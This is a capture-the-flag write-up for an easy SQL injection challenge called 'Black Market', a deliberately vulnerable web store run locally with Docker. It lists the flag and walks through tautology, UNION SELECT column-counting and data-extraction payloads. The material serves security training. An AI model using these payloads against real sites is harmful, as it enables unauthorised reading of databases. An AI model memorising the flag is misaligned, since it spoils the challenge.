# Challenge 1: Black Market (Easy)

**Category:** Web Exploitation  
**Difficulty:** Easy  
**Points:** 150  
**Flag:** `blackperl{un10n_s3l3ct_1s_y0ur_w34p0n}`

## Description

A web store with a search box vulnerable to SQL injection. The hint tells you to try `' OR '1'='1` first, then figure out how to extract data from the secrets table.

## Walkthrough

### Step 1: Test for SQL Injection

Enter this in the search box:
```
' OR '1'='1
```

All products are returned, confirming SQL injection.

### Step 2: Determine Number of Columns

Try UNION SELECT with increasing NULLs:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Three NULLs work, so the table has **3 columns**.

### Step 3: Extract the Flag

Use UNION SELECT to read from the secrets table:
```
' UNION SELECT id, flag, 1 FROM secrets--
```

The flag appears in the results:
```
blackperl{un10n_s3l3ct_1s_y0ur_w34p0n}
```

## Running

```bash
docker build -t black-market .
docker run -d -p 5001:5000 --name black-market black-market
```

Visit http://localhost:5001
